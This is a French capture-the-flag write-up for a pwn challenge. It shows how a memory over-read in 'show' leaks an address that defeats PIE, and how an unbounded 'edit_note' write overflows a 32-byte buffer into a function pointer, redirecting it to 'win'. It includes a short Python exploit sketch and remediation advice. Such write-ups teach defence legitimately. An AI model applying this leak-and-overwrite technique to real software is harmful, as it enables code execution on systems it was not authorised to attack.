---
title: "Aného manifestd — leak PIE puis écrasement d'un handler"
date: 2026-11-19 16:10:00 +0000
categories: ["NCTF26 Finale", "Pwn"]
tags: [pwn, pie, buffer-overflow, function-pointer, leak]
lang: fr
ctf: "NCTF26 Finale"
category_label: "Pwn"
difficulty: medium
flag_format: "NCTF{...}"
author: alwil17
toc: true
---

> **TL;DR** — Un gestionnaire de notes qui fuit une adresse interne via `show`
> (donc l'adresse de `win` malgré le PIE), et dont `edit_note` déborde un buffer
> `note[32]` jusqu'à un pointeur de fonction `handler`. J'écris l'adresse de `win`
> dans `handler`, j'appelle `run_handler`, et j'obtiens le shell/flag. **Flag :**
> `NCTF{…}`.

## 1. Reconnaissance

Le service propose `add`, `show`, `edit_note`, `run_handler`. Le binaire est en PIE,
donc je n'ai pas d'adresse fixe au départ.

## 2. Fuite de l'adresse

`add` puis `show` renvoie plus que ma note : la lecture déborde et laisse fuir une
adresse interne. À partir d'elle, je calcule la base PIE et donc l'adresse de la
fonction `win`.

## 3. Débordement vers le handler

`edit_note` écrit dans `note[32]` sans borne : au-delà des 32 octets, j'atteins le
pointeur `handler`. Je le remplace par l'adresse de `win` :

```python
leak   = leak_from_show()
base   = leak - OFF_LEAK
win    = base + OFF_WIN
edit_note(b"A"*32 + p64(win))   # note[32] overflow -> handler = win
run_handler()                   # appelle win()
```

## 4. Flag

```text
NCTF{…}
```

## 5. Leçons & remédiation

- **Borner chaque écriture** (`edit_note`) et **ne jamais sur-lire** dans `show` :
  les deux primitives combinées (leak + overflow) suffisent, même avec PIE.
- Séparer les données des pointeurs de fonction, ou passer par une table d'index
  validée plutôt qu'un pointeur brut écrasable.
